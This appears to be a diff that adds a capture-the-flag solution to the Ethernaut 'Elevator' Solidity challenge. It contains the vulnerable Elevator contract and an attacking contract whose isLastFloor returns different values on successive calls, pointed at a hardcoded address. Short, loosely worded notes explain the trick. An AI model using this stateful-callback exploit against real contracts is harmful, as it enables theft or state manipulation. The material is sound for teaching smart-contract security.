@@ -1,0 +1,58 @@
+pragma solidity ^0.5.0;
+
+
+interface Building {
+  function isLastFloor(uint) external returns (bool);
+}
+
+
+contract Elevator {
+  bool public top;
+  uint public floor;
+
+  function goTo(uint _floor) public {
+    Building building = Building(msg.sender);
+
+    if (! building.isLastFloor(_floor)) {
+      floor = _floor;
+      top = building.isLastFloor(floor);
+    }
+  }
+}
+
+
+contract myBuilding{
+    
+    Elevator E = Elevator(0xcfA91e2bdF9EB567af8480d424A6e22e139ad7E2);
+    bool lastFloor;
+    
+    function isLastFloor(uint) external returns (bool){
+        
+        
+        if (! lastFloor){
+            
+            lastFloor = true;
+            return false;
+            
+        }
+        
+        return true;
+    
+        
+    }
+    
+    function run() public{
+        E.goTo(7);
+    }
+    
+    
+}
+
+
+
+
+The contract never implemented the interface and so we can call our contract which implements the interface for us
+Here the condition in "if statement" continues iff it evaluates to false because !false will continue the loop. However that same value will be allocated to top and thus it will never be true
+We need to implement the interface in such a way that the "if statement" goes to true which will let us in the function
+and then the "top" should be true.
+So we implement such a way that if goes inside the function and then returns true
